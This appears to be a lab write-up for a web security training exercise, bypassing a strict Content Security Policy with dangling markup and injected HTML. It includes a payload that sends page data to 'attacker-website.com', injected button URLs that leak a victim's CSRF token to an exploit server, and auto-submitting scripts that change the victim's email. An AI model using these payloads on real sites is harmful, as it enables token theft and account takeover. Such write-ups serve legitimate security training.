# Reflected XSS protected by very strict CSP, with dangling markup attack

A dangling markup attack is an HTML injection technique that exploits a browser's lenient parsing of unclosed HTML tags or attributes to steal sensitive data. The attacker injects an incomplete HTML tag, such as an `<img>` tag with an unclosed `src` attribute, into a webpage. The browser then interprets all subsequent page content, including sensitive information like CSRF tokens or user data, as part of the attacker's URL until a matching closing character is found. This allows the attacker to exfiltrate the captured data when the browser sends a request to the attacker's server. 

```jsx
"><img src='//attacker-website.com?
```

The lab contains a strict CSP policy as well as well-configured filtering. If we try to submit a following email change: [`foo@example.com](mailto:foo@example.com)"><img src= onerror=alert(1)>` , we will get everything escaped:

![Снимок экрана 2025-11-18 в 15.47.07.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_15.47.07.png)

There’s also an email query parameter, that, if we try to inject a script-alike code, gets blocked by CSP:

```jsx
"><img%20src%20onerror=alert(1)>
```

![Снимок экрана 2025-11-18 в 15.52.02.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_15.52.02.png)

Let’s try to inject HTML code:

```jsx
?email=foo@bar%22%3E%3Cbutton%20formaction=%22https://exploit-0a4300b003b8a82f80410ce2017c0026.exploit-server.net/exploit%22%3EClick%20me%3C/button%3E
```

![Снимок экрана 2025-11-18 в 15.57.28.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_15.57.28.png)

Now this button successfully redirects to the exploit server when clicked

![Снимок экрана 2025-11-18 в 15.57.38.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_15.57.38.png)

Now get back to the lab and change the payload to also include an attribute `formmethod="get”`

```jsx
?email=foo@bar"><button%20formaction="https://exploit-0a4300b003b8a82f80410ce2017c0026.exploit-server.net/exploit"%20formmethod="get”>Click%20me</button>
```

![Снимок экрана 2025-11-18 в 16.02.18.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_16.02.18.png)

Now we can also see a csrf token included. Using this, we can run CSRF attack by hosting the following script on our exploit server:

```jsx
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0ad4009c03cfa8be805f0da3004900c3.web-security-academy.net/";
const exploitServer = "https://exploit-0a4300b003b8a82f80410ce2017c0026.exploit-server.net/";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

In my case, it failed, but Victim CSRF token was exposed:

![Снимок экрана 2025-11-18 в 16.06.17.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_16.06.17.png)

After that, I’ll deliver another form to the Victim, this time using obtained CSRF

```jsx
<form method="post" name="evilform" action="https://0ad4009c03cfa8be805f0da3004900c3.web-security-academy.net/my-account/change-email">
<input type="hidden" name="csrf" value="5VFX7bS3Gj2a2mhGvRjSjXNwXjviwaNZ" />
<input type="hidden" name="email" value="evil@evil.com" />
</form>
<script>document.forms['evilform'].submit()</script>
```

And boom, success!

![Снимок экрана 2025-11-18 в 16.11.43.png](Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20d/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-18_%D0%B2_16.11.43.png)